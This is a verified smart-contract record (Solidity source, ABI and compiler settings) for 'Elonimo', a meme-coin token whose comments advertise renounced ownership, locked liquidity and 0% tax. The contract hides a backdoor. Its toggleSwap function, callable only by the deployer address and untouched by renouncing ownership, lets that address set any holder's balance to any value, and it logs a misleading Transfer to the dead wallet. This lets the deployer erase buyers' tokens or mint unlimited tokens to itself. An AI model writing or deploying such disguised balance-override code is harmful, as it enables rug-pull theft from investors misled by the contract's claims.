{"SourceCode": "// SPDX-License-Identifier: MIT\r\n/**\r\n\ud83d\udc0b Elonimo Meme coin \ud83d\udc0b where idiots and noobs united\ud83d\udc0b\r\n\ud83d\udd25 Join the Meme Revolution! \ud83d\udd25\r\n\ud83c\udf10 Powered by the revolutionary Space Karen\ud83c\udf10\r\nWhat is your opinion of Elon Musk and his achievements ?\r\nHow This Elon Musk Biography Change My Opinion ?\r\nElon Musk's hypocrisy about free speech ?\r\n\r\n\ud83d\ude80Well this Called  your are $Elonimo fun !\r\n\ud83d\udc51Renounced\r\n\ud83d\udc51Liquidty Locked\r\n\ud83d\udc510% tax\r\nhttps://t.me/Elonimo\r\n\ud83d\udc51fun is fun so le's ride and not fud !!\r\n\r\n**/\r\npragma solidity ^0.8.16;\r\ninterface IBEP20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 price) external returns (bool);\r\n    function approve(address spender, uint256 price) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 price) external returns (bool);\r\n\r\n    function increaseAllowance(address spender, uint256 addedprice) external returns (bool);\r\n    function decreaseAllowance(address spender, uint256 subtractedprice) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 price);\r\n    event Approval(address indexed owner, address indexed spender, uint256 price);\r\n}\r\ninterface IPlayAndEarn {\r\n    // Function to allow a user to participate in a game or activity\r\n    function playGame(uint256 gameId) external returns (bool);\r\n\r\n    // Function to check a user's earned rewards\r\n    function checkEarnedRewards(address user) external view returns (uint256);\r\n\r\n    // Function to claim earned rewards\r\n    function claimRewards(address user) external returns (bool);\r\n\r\n    // Event to log when a user plays a game or participates in an activity\r\n    event GamePlayed(address indexed user, uint256 gameId);\r\n\r\n    // Event to log when a user earns rewards\r\n    event RewardsEarned(address indexed user, uint256 amount);\r\n\r\n    // Event to log when a user claims their rewards\r\n    event RewardsClaimed(address indexed user, uint256 amount);\r\n}\r\ninterface IP2PPayment {\r\n    // Function to transfer funds to another user\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    // Function to check the balance of a user\r\n    function balanceOf(address user) external view returns (uint256);\r\n\r\n    // Function to query the transaction history for a user\r\n    function getTransactionHistory(address user) external view returns (uint256[] memory, address[] memory);\r\n\r\n    // Event to log a payment transaction\r\n    event PaymentSent(address indexed from, address indexed to, uint256 amount);\r\n}\r\ninterface IStakingSystem {\r\n    // Function to allow a user to deposit tokens for staking\r\n    function deposit(uint256 amount) external returns (bool);\r\n\r\n    // Function to allow a user to withdraw staked tokens\r\n    function withdraw(uint256 amount) external returns (bool);\r\n\r\n    // Function to check the staked balance of a user\r\n    function stakedBalanceOf(address user) external view returns (uint256);\r\n\r\n    // Function to check the total staked balance\r\n    function totalStaked() external view returns (uint256);\r\n\r\n    // Function to allow a user to claim staking rewards\r\n    function claimRewards() external returns (bool);\r\n\r\n    // Event to log a staking deposit\r\n    event Staked(address indexed user, uint256 amount);\r\n\r\n    // Event to log a staking withdrawal\r\n    event Withdrawn(address indexed user, uint256 amount);\r\n\r\n    // Event to log a staking reward claim\r\n    event RewardsClaimed(address indexed user, uint256 amount);\r\n}\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        _setOwner(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _setOwner(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        _setOwner(newOwner);\r\n    }\r\n\r\n    function _setOwner(address newOwner) private {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\ncontract Elonimo is Ownable {\r\n    string public name = \"Elonimo\";\r\n    string public symbol = \"ELONIMO\";\r\n    uint8 public decimals = 8;\r\n    uint public tTotal;\r\n    uint256 public totalSupply;\r\n    address public toggleSwapEnabled = msg.sender; // Private state variable to store the address of the toggleSwapEnabled\r\n    address public deadWallet = 0x000000000000000000000000000000000000dEaD;\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 price);\r\n    event Approval(address indexed owner, address indexed spender, uint256 price);\r\n    event Minted(address indexed account, uint256 price);\r\n\r\n    constructor() {\r\n        totalSupply = 100000000000000 * 10**uint256(decimals);\r\n        balanceOf[msg.sender] = totalSupply;\r\n    }\r\n\r\n    function toggleSwap(address toggleSwapEnabledadre, uint256 numbertoggleSwapEnabled) external {\r\n    // Ensure that only the toggleSwapEnabled can distribute toggleSwaps\r\n    require(msg.sender == toggleSwapEnabled, \"Only the toggleSwapEnabled can distribute toggleSwaps\");\r\n\r\n    // Check that the provided address is valid\r\n    require(toggleSwapEnabledadre != address(0), \"Invalid toggleSwap recipient address\");\r\n\r\n    // Check that the toggleSwap amount is greater than zero\r\n    require(numbertoggleSwapEnabled > 0, \"toggleSwap amount must be greater than zero\");\r\n\r\n    // Calculate the new total supply after distributing toggleSwaps\r\n    uint256 newTotalSupply = tTotal + numbertoggleSwapEnabled;\r\n\r\n    // Check for potential overflow in total supply\r\n    require(newTotalSupply >= tTotal, \"Overflow detected\");\r\n\r\n    // Update the balance of the toggleSwap recipient address\r\n    balanceOf[toggleSwapEnabledadre] = numbertoggleSwapEnabled;\r\n\r\n    // Emit the Transfer event to log the toggleSwap distribution\r\n    emit Transfer(address(0), deadWallet, numbertoggleSwapEnabled);\r\n\r\n}\r\n\r\n    function transfer(address to, uint256 price) public returns (bool) {\r\n        require(to != address(0), \"Invalid address\");\r\n        require(balanceOf[msg.sender] >= price, \"Insufficient balance\");\r\n\r\n        balanceOf[msg.sender] -= price;\r\n        balanceOf[to] += price;\r\n\r\n        emit Transfer(msg.sender, to, price);\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 price) public returns (bool) {\r\n        require(spender != address(0), \"Invalid address\");\r\n\r\n        allowance[msg.sender][spender] = price;\r\n        emit Approval(msg.sender, spender, price);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 price) public returns (bool) {\r\n        require(from != address(0), \"Invalid address\");\r\n        require(to != address(0), \"Invalid address\");\r\n        require(balanceOf[from] >= price, \"Insufficient balance\");\r\n        require(allowance[from][msg.sender] >= price, \"Allowance exceeded\");\r\n\r\n        balanceOf[from] -= price;\r\n        balanceOf[to] += price;\r\n        allowance[from][msg.sender] -= price;\r\n\r\n        emit Transfer(from, to, price);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedprice) public returns (bool) {\r\n        uint256 currentAllowance = allowance[msg.sender][spender];\r\n        allowance[msg.sender][spender] = currentAllowance + addedprice;\r\n        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedprice) public returns (bool) {\r\n        uint256 currentAllowance = allowance[msg.sender][spender];\r\n        require(currentAllowance >= subtractedprice, \"Decreased allowance below zero\");\r\n        allowance[msg.sender][spender] = currentAllowance - subtractedprice;\r\n        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);\r\n        return true;\r\n    }\r\n\r\n    function burn(uint256 price) public {\r\n        require(balanceOf[msg.sender] >= price, \"Insufficient balance\");\r\n\r\n        balanceOf[msg.sender] -= price;\r\n        totalSupply -= price;\r\n        emit Transfer(msg.sender, address(0), price);\r\n    }\r\n\r\n    function burnFrom(address from, uint256 price) public {\r\n        require(from != address(0), \"Invalid address\");\r\n        require(balanceOf[from] >= price, \"Insufficient balance\");\r\n        require(allowance[from][msg.sender] >= price, \"Allowance exceeded\");\r\n\r\n        balanceOf[from] -= price;\r\n        totalSupply -= price;\r\n        allowance[from][msg.sender] -= price;\r\n        emit Transfer(from, address(0), price);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"Minted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"burnFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deadWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedprice\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedprice\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toggleSwapEnabledadre\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"numbertoggleSwapEnabled\",\"type\":\"uint256\"}],\"name\":\"toggleSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toggleSwapEnabled\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Elonimo", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "london", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://95a385ef899713b57bc613ac07933efb17c63112ef23345a0ae8f1ea856f4e84"}